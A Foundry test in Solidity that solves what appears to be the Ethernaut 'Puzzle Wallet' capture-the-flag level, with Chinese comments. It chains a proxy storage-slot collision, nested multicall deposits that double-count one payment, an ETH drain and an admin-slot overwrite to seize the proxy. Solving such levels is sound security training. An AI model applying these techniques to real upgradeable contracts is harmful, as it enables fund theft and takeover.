// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./PuzzleWalletFactory.sol";

contract PuzzleWalletTest is Test {
    PuzzleWalletFactory factory;

    bytes32 constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {
        factory = new PuzzleWalletFactory();
    }

    function testPuzzleWallet() public {
        address puzzleProxy = factory.createInstance{value: 0.001 ether}(address(this));
        // address puzzleWallet = address(uint160(uint256(vm.load(puzzleProxy, _IMPLEMENTATION_SLOT))));

        PuzzleProxy(payable(puzzleProxy)).proposeNewAdmin(address(this)); // 让合约成为PuzzleWallet的owner
        PuzzleWallet(puzzleProxy).addToWhitelist(address(this)); // 让合约成为白名单用户

        bytes memory depositData = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        bytes[] memory depositDatas = new bytes[](1);
        depositDatas[0] = depositData;

        bytes memory multicallData = abi.encodeWithSelector(PuzzleWallet.multicall.selector, depositDatas);
        bytes[] memory multicallDatas = new bytes[](2);
        multicallDatas[0] = multicallData;
        multicallDatas[1] = multicallData;

        bytes memory Data = abi.encodeWithSelector(PuzzleWallet.multicall.selector, multicallDatas);
        bytes[] memory Datas = new bytes[](1);
        Datas[0] = Data;

        PuzzleWallet(puzzleProxy).multicall{value: 0.001 ether}(Datas); //重入攻击，使合约中余额变成转账的两倍，合约ETH余额0.001，所以我们转0.001，合约ETH余额变为0.002，我们在合约中的余额也变为0.002

        PuzzleWallet(puzzleProxy).execute(msg.sender, address(PuzzleWallet(puzzleProxy)).balance, ""); //转空合约中的eth

        PuzzleWallet(puzzleProxy).setMaxBalance(uint256(uint160(address(this)))); //让合约成为admin

        PuzzleProxy(payable(puzzleProxy)).upgradeTo(address(this)); // 吃饭完，掀桌子
        PuzzleProxy(payable(puzzleProxy)).proposeNewAdmin(address(this)); //让我的账户成为admin
        PuzzleProxy(payable(puzzleProxy)).approveNewAdmin(address(this));

        assertTrue(factory.validateInstance(payable(puzzleProxy), address(this)));
    }
}
